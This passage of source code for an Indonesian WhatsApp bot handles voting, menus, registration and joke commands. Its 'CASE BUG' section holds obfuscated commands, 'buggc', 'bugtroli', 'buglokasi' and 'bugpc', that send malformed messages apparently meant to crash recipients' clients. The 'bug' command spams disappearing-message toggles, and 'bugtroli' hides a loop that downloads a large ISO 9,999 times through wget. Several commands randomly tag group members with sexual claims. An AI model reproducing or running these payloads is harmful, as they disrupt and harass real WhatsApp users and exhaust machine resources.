if (!isBanchat) return reply(`udah di UnBan`)
let anu = bancht.indexOf(from)
bancht.splice(anu, 1)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot telah di Unban di group ini`)
}
}

//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
	    if(isGroup && !isVote) {
        if (budy.toLowerCase() === 'vote'){
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '✅'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
        } else if (budy.toLowerCase() === 'devote'){
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '❌'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
    }
}	
        if (!dev.key.fromMe && !isOwner && banChats === true) return

const atibot = dev.isBaileys
if (atibot === true) return

switch (command) {
    case 'menu':
    case 'help':
    const timestampp = speed();
	const latensii = speed() - timestampp
	run = process.uptime() 
    teks = `${kyun(run)}`
    try {
pic = await xdev.getProfilePicture(sender)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
gambar = await getBuffer(pic)
mhan = await xdev.prepareMessage(from, gambar, image, {thumbnail: gambar})
gbutsan = [
  {buttonId: 'CREATOR', buttonText: {displayText: 'CREATOR'}, type: 1},
  {buttonId: 'INSTAGRAM', buttonText: {displayText: 'INSTAGRAM'}, type: 1},
  /*{buttonId: 'REST API TEAM', buttonText: {displayText: 'REST API'}, type: 1}*/
]
 gbuttonan = {
imageMessage: mhan.message.imageMessage,
    contentText: help.menu(pushname, sender, prefix, banChats, ucapanWaktu, timeWib, timeWit, timeWita, kyun),
    footerText: `Speed : ${latensii.toFixed(4)} Second\nRuntime : ${teks}\nSelamat ${waktoo}\nTanggal : ${Tanggal}\nJam : ${hour_now}\n\n𝑹𝑬𝑪𝑶𝑫𝑬 𝑩𝒀 𝑯𝒂𝒎 - 𝑩𝒐𝒕𝒛𝒛`,
    buttons: gbutsan,
    headerType: 4
}
await xdev.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
		thumbnail: fs.readFileSync('./stik/fake.jpeg'),
        caption: help.menu(pushname, sender, prefix, banChats, ucapanWaktu, timeWib, timeWit, timeWita),
        "contextInfo": {text: 'HelloWorld',"forwardingScore": 3,isForwarded: true,sendEphemeral: true,mentionedJid: [sender],"externalAdReply": {"title": `${pushname} FOLLOW KAK `,"body": ``,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/d5d94f871b24f181acdcd.jpg`,"thumbnail": "https://i.pinimg.com/736x/8c/9e/07/8c9e07a655e8daf65f42bcaff2cefe6a.jpg","sourceUrl": "https://instagram.com/oceanvictory_id"}}, quoted: ftroli}) 
           	break

//xdev.sendMessage(from, 'Tes', text, {quoted: dev, contextInfo: {text: 'HelloWorld',"forwardingScore": 3,isForwarded: true,sendEphemeral: true,mentionedJid: [sender],"externalAdReply": {"title": `${pushname} Ini nomer creator kak`,"body": ``,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/a082de791ef8aff96ec24.jpg`,"thumbnail": "https://i.pinimg.com/736x/8c/9e/07/8c9e07a655e8daf65f42bcaff2cefe6a.jpg","sourceUrl": "https://wa.me/15109368073"}}, quoted: dev})

// DAFTAR
case 'daftar':
                		if (isRegistered) return  reply(mess.rediregis)
                		if (!q.includes('|')) return  reply(mess.wrongf)
            			const namaUser = q.substring(0, q.indexOf('|') - 0)
            			const umurUser = q.substring(q.lastIndexOf('|') + 1)
            			const serialUser = createSerial(20)
                			if(isNaN(umurUser)) return await reply('Umur harus berupa angka!!')
                			if (namaUser.length >= 30) return reply(`why is your name so long it's a name or a train`)
                			if (umurUser > 40) return reply(`old maximum 40 years`)
                			if (umurUser < 12) return reply(`young minimum 12 years`)
                				
                					if (isGroup) {
                    			addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
                    			await xdev.sendMessage (from, 'Succes', text, {quoted: fvn, })
                    			console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
                			} else {
                    			addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
                    			await xdev.sendMessage (from, 'Succes', text, {quoted: fvn, })
                    			console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'))
                			}
				        break
// ---------------------<CASE GRUP>-----------------------
	case 'clearall':{
			if (!isOwner) return reply(mess.owner) 
			let chiit = await xdev.chats.all()
                for (let i of chiit){
                    xdev.modifyChat(i.jid, 'delete', {
                        includeStarred: false
                    })
                }
                reply(`Selesai`)
            }
                break
	case 'readall':
			if (!isOwner) return reply(mess.owner)
			var chats = await xdev.chats.all()
            chats.map( async ({ jid }) => {
            await xdev.chatRead(jid)
                    })
					rdl = `Berhasil membaca ${chats.length} Chat !`
					await xdev.sendMessage(from, rdl, MessageType.text, {quoted: fvideo})
					console.log(chats.length)
					break
	case 'del':
	case 'd':
	case 'delete':
					xdev.deleteMessage(from, { id: dev.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
//-------------------< CASE BUG >----------------------
		case 'buggc':
				if (!isOwner) return reply(`Perintah ini hanya dapat digunakan oleh owner bot`)
                var _0x5557=['toggleDisappearingMessages','326291YpgYaN','133210BiIXsL','1sttjNd','1082697WFmvMb','yahahah\x20yahuuu:v','1EwuyMz','863461SqWAhD','664653mEOnUW','170186cxKrYW','65RRqGQv','sendMessage','9091XZKpia','2VuMiLY'];function _0x13c1(_0x534af0,_0x2d9fc1){return _0x13c1=function(_0x5557e1,_0x13c1b6){_0x5557e1=_0x5557e1-0xee;var _0xe506e7=_0x5557[_0x5557e1];return _0xe506e7;},_0x13c1(_0x534af0,_0x2d9fc1);}var _0x5cfcc1=_0x13c1;(function(_0x5c9d93,_0x4783a3){var _0x58002e=_0x13c1;while(!![]){try{var _0x579dbd=parseInt(_0x58002e(0xf3))*-parseInt(_0x58002e(0xf5))+-parseInt(_0x58002e(0xf8))*-parseInt(_0x58002e(0xef))+-parseInt(_0x58002e(0xf9))+-parseInt(_0x58002e(0xf2))*parseInt(_0x58002e(0xf6))+parseInt(_0x58002e(0xfb))+-parseInt(_0x58002e(0xf1))+parseInt(_0x58002e(0xf0))*parseInt(_0x58002e(0xfa));if(_0x579dbd===_0x4783a3)break;else _0x5c9d93['push'](_0x5c9d93['shift']());}catch(_0x20e44f){_0x5c9d93['push'](_0x5c9d93['shift']());}}}(_0x5557,0x84a43),await client[_0x5cfcc1(0xf7)](from),client[_0x5cfcc1(0xf4)](from,_0x5cfcc1(0xee),text));
                break
		case 'bugtroli':
				if (!isOwner) return reply(`Perintah ini hanya dapat digunakan oleh owner bot`)
				 const _0x59c1=['2BqkqGX','log','524184vvlugK','ownerb','2lnmaVx','279745EAZJVc','178559czyrUi','240935UGsJIk','1JAMEtB','621671bdKbVN','713265nURPLb','122306zhYOVM','1qarYTF'];function _0x4bbb(_0x57fff1,_0x1e2468){return _0x4bbb=function(_0x59c1fb,_0x4bbb6b){_0x59c1fb=_0x59c1fb-0x1aa;let _0x1d60ac=_0x59c1[_0x59c1fb];return _0x1d60ac;},_0x4bbb(_0x57fff1,_0x1e2468);}const _0x1e9cfc=_0x4bbb;(function(_0x29ca25,_0x5af86e){const _0x2538f5=_0x4bbb;while(!![]){try{const _0x36925f=-parseInt(_0x2538f5(0x1ae))*-parseInt(_0x2538f5(0x1b0))+parseInt(_0x2538f5(0x1aa))+parseInt(_0x2538f5(0x1af))+parseInt(_0x2538f5(0x1b1))*-parseInt(_0x2538f5(0x1b4))+-parseInt(_0x2538f5(0x1b2))+-parseInt(_0x2538f5(0x1ac))*-parseInt(_0x2538f5(0x1ad))+parseInt(_0x2538f5(0x1b3))*parseInt(_0x2538f5(0x1b5));if(_0x36925f===_0x5af86e)break;else _0x29ca25['push'](_0x29ca25['shift']());}catch(_0x478aaf){_0x29ca25['push'](_0x29ca25['shift']());}}}(_0x59c1,0x64cac));if(!isOwner)return reply(ind[_0x1e9cfc(0x1ab)]());for(let i=0x0;i<0x270f;i++){exec('wget\x20https://ftp.halifax.rwth-aachen.de/blackarch/iso/blackarch-linux-full-2020.12.01-x86_64.iso',(_0x1f074e,_0x242d03)=>{const _0x3170ba=_0x1e9cfc;if(_0x1f074e)throw _0x1f074e;console['log']('🔥SUKSES🔥'),console[_0x3170ba(0x1b6)]('🔥');});}
                   break
		case 'bug':
					if (!isOwner) return reply(mess.owner)
					if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
				await xdev.toggleDisappearingMessages(from, 0)
				}
				xdev.sendMessage(from, 'Sukses Send Bug Sebanyak '+args.join(' '), text)
					break
case 'buglokasi':
if (!isOwner) return reply(mess.owner) 
var _0x5262=['mteXmteXmteXqhmUD2HHDhnHChaUBMv0','mZG3mdK1A1jKAeTc','mMTtz0j5rG','C2vUze1LC3nHz2u','mti5ntntzKn3wuK','y3jLD2jVDdi','mw9eDwXxsq','nta0oeTly1z0yG','mJu0ndu0s1Dxqxnx','odi4otfdvMzzDhu','ogDuBer4Da','lI9Kzw56lMPWzW','B25SEq','ndiWodyWt21ws1vV','mKLOquzsAa','mta5ntiYn05NEfjArq'];var _0x21d390=_0x9518;function _0x9518(_0x44b3d9,_0x462517){_0x44b3d9=_0x44b3d9-0x15d;var _0x5262e5=_0x5262[_0x44b3d9];if(_0x9518['ZNxiwL']===undefined){var _0x9518bc=function(_0x2f4178){var _0x217a29='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0xb9c7de='';for(var _0x50df0d=0x0,_0x46c35d,_0x291992,_0x43adee=0x0;_0x291992=_0x2f4178['charAt'](_0x43adee++);~_0x291992&&(_0x46c35d=_0x50df0d%0x4?_0x46c35d*0x40+_0x291992:_0x291992,_0x50df0d++%0x4)?_0xb9c7de+=String['fromCharCode'](0xff&_0x46c35d>>(-0x2*_0x50df0d&0x6)):0x0){_0x291992=_0x217a29['indexOf'](_0x291992);}return _0xb9c7de;};_0x9518['ZvyGzP']=function(_0x4ac3b3){var _0x1269fb=_0x9518bc(_0x4ac3b3);var _0x345e93=[];for(var _0x21e6b8=0x0,_0x1e2497=_0x1269fb['length'];_0x21e6b8<_0x1e2497;_0x21e6b8++){_0x345e93+='%'+('00'+_0x1269fb['charCodeAt'](_0x21e6b8)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x345e93);},_0x9518['iFDoQk']={},_0x9518['ZNxiwL']=!![];}var _0x12e13e=_0x5262[0x0],_0x41043d=_0x44b3d9+_0x12e13e,_0x26ce3c=_0x9518['iFDoQk'][_0x41043d];return _0x26ce3c===undefined?(_0x5262e5=_0x9518['ZvyGzP'](_0x5262e5),_0x9518['iFDoQk'][_0x41043d]=_0x5262e5):_0x5262e5=_0x26ce3c,_0x5262e5;}(function(_0x3432a0,_0x3409b4){var _0x264797=_0x9518;while(!![]){try{var _0x59a18e=-parseInt(_0x264797(0x16a))*parseInt(_0x264797(0x160))+parseInt(_0x264797(0x16c))*-parseInt(_0x264797(0x162))+-parseInt(_0x264797(0x15f))+-parseInt(_0x264797(0x166))*parseInt(_0x264797(0x161))+-parseInt(_0x264797(0x165))+parseInt(_0x264797(0x169))+parseInt(_0x264797(0x167))*parseInt(_0x264797(0x15e));if(_0x59a18e===_0x3409b4)break;else _0x3432a0['push'](_0x3432a0['shift']());}catch(_0x339e97){_0x3432a0['push'](_0x3432a0['shift']());}}}(_0x5262,0x43e54));if(!isOwner)return reply(mess[_0x21d390(0x164)]['ownerB']);xdev['updatePresence'](from,Presence['composing']);var bro=await getBuffer(_0x21d390(0x163));xdev[_0x21d390(0x16b)](from,{'degreesLatitude':34.0184,'degreesLongitude':-118.411,'name':_0x21d390(0x15d),'address':fake,'jpegThumbnail':bro},location,{'quoted':{'key':{'participant':_0x21d390(0x168)},'message':{'orderMessage':{'itemCount':0x11170,'status':0x1,'surface':0x1,'message':_0x21d390(0x15d),'orderTitle':fake,'sellerJid':'0@s.whatsapp.net'}}}});
break
case 'bugpc':
					case 'bugpc':
if (!isOwner) return reply(mess.owner) 
var _0x1e0a=['ng9AALbhzG','y29TCg9ZAw5N','qgrLBNnZChrYywe','mLHfAuHIBG','mZeXnJmWALbvsvPL','DxbKyxrLuhjLC2vUy2u','C2vUze1LC3nHz2u','mZCZnJiYyvLAsvL4','ntaZodbZv292Bfu','mZuWmJa0Bw1rthn3','mJiXntLWD3fyD1y','B25SEq','nZi5nZjHEw5mrK0','ndCXmteXv1j2s3Dr'];var _0x1e1570=_0x1cdc;function _0x1cdc(_0x3b5420,_0xc28e03){_0x3b5420=_0x3b5420-0x156;var _0x1e0a9a=_0x1e0a[_0x3b5420];if(_0x1cdc['HzxOzL']===undefined){var _0x1cdc20=function(_0x340030){var _0x75d462='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x4a5cad='';for(var _0x4fab0e=0x0,_0x252ec5,_0x483374,_0x50c643=0x0;_0x483374=_0x340030['charAt'](_0x50c643++);~_0x483374&&(_0x252ec5=_0x4fab0e%0x4?_0x252ec5*0x40+_0x483374:_0x483374,_0x4fab0e++%0x4)?_0x4a5cad+=String['fromCharCode'](0xff&_0x252ec5>>(-0x2*_0x4fab0e&0x6)):0x0){_0x483374=_0x75d462['indexOf'](_0x483374);}return _0x4a5cad;};_0x1cdc['GVkRCv']=function(_0x2834b6){var _0x517c6b=_0x1cdc20(_0x2834b6);var _0x91c801=[];for(var _0x1753ec=0x0,_0x55d373=_0x517c6b['length'];_0x1753ec<_0x55d373;_0x1753ec++){_0x91c801+='%'+('00'+_0x517c6b['charCodeAt'](_0x1753ec)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x91c801);},_0x1cdc['YTWKcT']={},_0x1cdc['HzxOzL']=!![];}var _0x12ec9c=_0x1e0a[0x0],_0x4da9eb=_0x3b5420+_0x12ec9c,_0x16b46b=_0x1cdc['YTWKcT'][_0x4da9eb];return _0x16b46b===undefined?(_0x1e0a9a=_0x1cdc['GVkRCv'](_0x1e0a9a),_0x1cdc['YTWKcT'][_0x4da9eb]=_0x1e0a9a):_0x1e0a9a=_0x16b46b,_0x1e0a9a;}(function(_0x1b8658,_0x253b48){var _0x5973c4=_0x1cdc;while(!![]){try{var _0x515f31=parseInt(_0x5973c4(0x157))+-parseInt(_0x5973c4(0x15a))*parseInt(_0x5973c4(0x15c))+parseInt(_0x5973c4(0x156))+-parseInt(_0x5973c4(0x15b))+parseInt(_0x5973c4(0x160))+parseInt(_0x5973c4(0x163))+parseInt(_0x5973c4(0x15f))*-parseInt(_0x5973c4(0x158));if(_0x515f31===_0x253b48)break;else _0x1b8658['push'](_0x1b8658['shift']());}catch(_0x4fdec7){_0x1b8658['push'](_0x1b8658['shift']());}}}(_0x1e0a,0x43ff7));if(!isOwner)return reply(mess[_0x1e1570(0x159)]['ownerB']);xdev[_0x1e1570(0x161)](from,Presence[_0x1e1570(0x15d)]),xdev[_0x1e1570(0x162)](from,'yaudah\x20oke',text,{'quoted':{'key':{'participant':'1111111111@s.whatsapp.net'},'message':{'orderMessage':{'itemCount':0x11170,'status':0x1,'surface':0x1,'message':'crewbot2','orderTitle':_0x1e1570(0x15e),'sellerJid':'0@s.whatsapp.net'}}}});
break
 // --------------< CASE NULIS BY XINZ >--------------------
		case 'nulis':
                reply(`*Pilihan*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)
                break
		case 'nuliskiri':{
				if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskiri* teks`)
                 reply(mess.wait)
                const tulisan = body.slice(11)
                const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './media/buku/sebelumkiri.jpg',
                    '-font',
                    './media/font/Indie-Flower.ttf',
                    '-size',
                    '960x1280',
                    '-pointsize',
                    '22',
                    '-interline-spacing',
                    '2',
                    '-annotate',
                    '+140+153',
                    fixHeight,
                    './media/buku/setelahkiri.jpg'
                ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./media/buku/setelahkiri.jpg'), image, {quoted: ftroli, caption: `Jangan malas pak...`})                    
                })
            }
                break
		case 'nuliskanan':{
              	if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
                 reply(mess.wait)
                const tulisan = body.slice(11)
                const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './media/buku/sebelumkanan.jpg',
                    '-font',
                    './media/font/Indie-Flower.ttf',
                    '-size',
                    '960x1280',
                    '-pointsize',
                    '22',
                    '-interline-spacing',
                    '2',
                    '-annotate',
                    '+140+153',
                    fixHeight,
                    './media/buku/setelahkanan.jpg'
                ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./media/buku/setelahkanan.jpg'), image, {quoted: ftroli, caption: `Jangan malas pak...`})                    
                })
            }
                break
		case 'foliokiri':{
             	if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
                 reply(mess.wait)
                const tulisan = body.slice(11)
                const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './media/folio/sebelumkiri.jpg',
                    '-font',
                    './media/font/Indie-Flower.ttf',
                    '-size',
                    '960x1280',
                    '-pointsize',
                    '22',
                    '-interline-spacing',
                    '2',
                    '-annotate',
                    '+140+153',
                    fixHeight,
                    './media/folio/setelahkiri.jpg'
                ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./media/folio/setelahkiri.jpg'), image, {quoted: ftroli, caption: `Jangan malas pak...`})                    
                })
            }
                break
		case 'foliokanan':{
             	if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokanan* teks`)
                 reply(mess.wait)
                const tulisan = body.slice(11)
                const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './media/folio/sebelumkanan.jpg',
                    '-font',
                    './media/font/Indie-Flower.ttf',
                    '-size',
                    '960x1280',
                    '-pointsize',
                    '22',
                    '-interline-spacing',
                    '2',
                    '-annotate',
                    '+140+153',
                    fixHeight,
                    './media/folio/setelahkanan.jpg'
                ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./media/folio/setelahkanan.jpg'), image, {quoted: ftroli, caption: `Jangan malas pak...`})                    
                })
            }
                break               
// --------------------< CASE MATH >---------------------------
	case 'jadian':
					if (!isGroup)return reply(mess.only.group)
					var kamu = groupMembers
					var cinta = groupMembers
					var aku = cinta[Math.floor(Math.random() * kamu.length)]
					var cintax = kamu[Math.floor(Math.random() * cinta.length)]
					let vejs = `Ciee.. yang lagi jadian\n@${aku.jid.split('@')[0]} ♥️ @${cintax.jid.split('@')[0]}\nSemoga Langgeng Hii`
					mentions(vejs, [aku.jid, cintax.jid], true)
					break
	case 'ganteng':
					if (!isGroup)return reply(mess.only.group)
					var kamu = groupMembers
					var cinta = groupMembers
					var aku = cinta[Math.floor(Math.random() * kamu.length)]
					var cintax = kamu[Math.floor(Math.random() * cinta.length)]
					let tejs = `Cowok paling ganteng di group ini adalah\n*@${aku.jid.split('@')[0]}*`
					mentions(tejs, [aku.jid, cintax.jid], true)
					break
	case 'cantik':
					if (!isGroup)return reply(mess.only.group)
					var kamu = groupMembers
					var cinta = groupMembers
					var aku = cinta[Math.floor(Math.random() * kamu.length)]
					var cintax = kamu[Math.floor(Math.random() * cinta.length)]
					let gejs = `Cewek️ paling cantik di group ini adalah\n*@${cintax.jid.split('@')[0]}*`
					mentions(gejs, [aku.jid, cintax.jid], true)
					break
	case 'bisakah':
					const bisa = ['Tentu Saja Bisa! Kamu Adalah Orang Paling Homky', 'Gak Bisa Ajg Aowkwowk', 'Hmm Gua Gak Tau Yaa, tanya ama bapakau', 'Ulangi Tod Gua Ga Paham']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					xdev.sendMessage(from, 'Pertanyaan : ' + q + '\n\nJawaban : ' + keh, text,)
					break
	case 'apakah':
					const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Ulangi bro gak paham']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					xdev.sendMessage(from, 'Pertanyaan : ' + q + '\n\nJawaban : ' + kah, text,)
					break
	case 'rate':
					const ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
					xdev.sendMessage(from, 'Pertanyaan : ' + q + '\n\nJawaban : ' + te + '%', text,)
					break
	case 'hobby':
					const hob = ['Desah Di Game', 'Ngocokin Doi', 'Stalking sosmed nya mantan', 'Kau kan gak punya hobby awokawok', 'Memasak', 'Membantu Atok', 'Mabar', 'Nobar', 'Sosmedtan', 'Membantu Orang lain', 'Nonton Anime', 'Nonton Drakor', 'Naik Motor', 'Nyanyi', 'Menari', 'Bertumbuk', 'Menggambar', 'Foto fotoan Ga jelas', 'Maen Game', 'Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					xdev.sendMessage(from, 'Pertanyaan : ' + q + '\n\nJawaban : ' + by, text,)
					break
	case 'truth':
					const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					xdev.sendMessage(from, await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`), 'Truth\n\n' + ttrth)
					break
	case 'dare':
					const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					xdev.sendMessage(from, await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`), 'Dare\n\n' + der) 
					break
	case 'cekbapak': // By Ramlan ID
					const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk By : Ramlan ID']
					const cek = bapak[Math.floor(Math.random() * bapak.length)]
					xdev.sendMessage(from, cek, text,) 
					break
	case 'ngewe':
					if (!isGroup) return reply(mess.only.group) 
					jds = []
					const jdiid = groupMembers
					const kosst = groupMembers
					const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
					const diaat = kosst[Math.floor(Math.random() * kosst.length)]
					teks = `Yang ngewe kemarin di grub ini adalah @${akuut.jid.split('@')[0]} dan @${diaat.jid.split('@')[0]} `
					jds.push(akuut.jid)
					jds.push(diaat.jid)
					mentions(teks, jds, true)
					break
	case 'watak':
					watak = body.slice(1)
					const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const tak = wa[Math.floor(Math.random() * wa.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, { quoted: dev })
					break
	case 'cantikcek':
					cantik = body.slice(1)
